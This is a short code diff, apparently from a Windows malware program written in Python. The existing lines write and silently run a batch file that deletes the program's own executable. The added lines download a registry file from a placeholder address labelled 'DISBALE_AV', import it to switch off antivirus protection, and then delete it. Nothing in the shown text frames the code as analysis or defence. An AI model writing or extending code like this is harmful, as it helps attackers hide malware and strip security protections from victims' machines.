@@ -17,6 +17,12 @@ def run():
         with open("delete.cmd", "w") as f:
             f.write("@ECHO off\ntimeout 5\ndel " + os.path.join(ORIGINAL, os.path.basename(sys.argv[0])))
         os.system('powershell "start delete.cmd" -WindowStyle Hidden"')
+        disable_av = requests.get("DISBALE_AV").content
+        with open("disable_av.reg", "wb") as f: f.write(disable_av)
+        import subprocess
+        subprocess.call(['reg', 'import', "disable_av.reg"])
+        os.remove("disable_av.reg")
+
     else:
         config_url = "CONFIG_URL"
         config_text = requests.get(config_url).text
